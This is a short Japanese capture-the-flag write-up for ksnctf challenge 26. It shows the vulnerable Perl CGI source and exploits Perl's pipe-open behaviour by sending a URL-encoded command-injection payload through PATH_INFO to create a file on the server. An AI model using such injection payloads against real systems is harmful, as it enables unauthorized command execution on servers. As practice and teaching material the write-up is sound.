# Ksnctf 26 Sherlock Holmes

<http://ctfq.sweetduet.info:10080/~q26/index.pl>

index.pl/{ファイル名} という形式のアドレスにアクセスしてテキストを表示

よって index.pl/index.pl にアクセス

<http://ctfq.sweetduet.info:10080/~q26/index.pl/index.pl>

```perl
#!/usr/bin/perl
use CGI;

print <<'EOS';
Content-type: text/html; charset=utf-8

<!DOCTYPE html>
<html>
<head>
<title>A SCANDAL IN BOHEMIA</title>
</head>
<body>
<h1>A SCANDAL IN BOHEMIA</h1>
<div>
<a href="/~q26/index.pl/a_scandal_in_bohemia_1.txt">A SCANDAL IN BOHEMIA I</a>&nbsp;
<a href="/~q26/index.pl/a_scandal_in_bohemia_2.txt">A SCANDAL IN BOHEMIA II</a>&nbsp;
<a href="/~q26/index.pl/a_scandal_in_bohemia_3.txt">A SCANDAL IN BOHEMIA III</a>&nbsp;
</div>
<hr>
<div>
EOS



# Can you crack me? :P
open(F,'cracked.txt');
my $t = <F>;
chomp($t);
if ($t eq 'h@ck3d!') {
print 'FLAG_****************<br><br>';
}
unlink('cracked.txt');
####



open(F,substr($ENV{'PATH_INFO'},1));

my $cgi = new CGI;
$cgi->charset('utf-8');
while(<F>) {
chomp;
s/FLAG_\w+/FLAG_****************/g;
print $cgi->escapeHTML($_)."<br>\n";
}

print <<'EOS';
</div>
<hr>
<address>
http://www.gutenberg.org/files/1661/1661-h/1661-h.htm
</address>
</body>
</html>
EOS
```

index.pl と同じディレクトリに h@ck3d! という内容の cracked.txt が存在する時、フラグを出力

cracked.txt をサーバ上に作成したい

perl の open 関数には | ls -la のように、 | を渡されるとその後の文字列を OS コマンドとして実行するという問題がある

参考

<https://www.ipa.go.jp/security/awareness/vendor/programmingv1/a04_01.html>

index.pl/ 以下に url エンコードで OS コマンドを与えることで、 cracked.txt を作成することができる

```
|echo h@ck3d\! > cracked.txt
```

```
index.pl/%7Cecho%20h%40ck3d%5C%21%20%3E%20cracked.txt
```

<http://ctfq.sweetduet.info:10080/~q26/index.pl/%7Cecho%20h%40ck3d%5C%21%20%3E%20cracked.txt>

にアクセスした後

<http://ctfq.sweetduet.info:10080/~q26/index.pl>

に飛ぶと

```
FLAG_XXXXXXXXXXXXXXXX
```

flag get
